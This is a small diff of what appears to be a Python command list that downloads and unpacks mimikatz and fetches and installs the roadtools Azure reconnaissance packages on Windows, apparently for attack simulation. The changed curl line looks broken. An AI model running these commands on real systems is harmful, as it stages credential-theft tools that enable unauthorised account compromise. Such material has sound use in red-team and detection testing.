@@ -5,7 +5,7 @@ COMMANDS = [
     r'mkdir C:\hello',
     r'curl.exe -L https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip -o C:\hello\hello.zip',
     r'Expand-Archive -Path "C:/hello/hello.zip" -DestinationPath "C:/hello/hello"',
-    r'curl.exe -L https://github.com/dirkjanm/roadtools.git',
+    r'curl.exe -L https://github.com/dirkjanm/roadtools.git -o C:\hello',
     r'pip install roadlib/',
     r'pip install roadtx/',
     r'pip install roadrecon/',
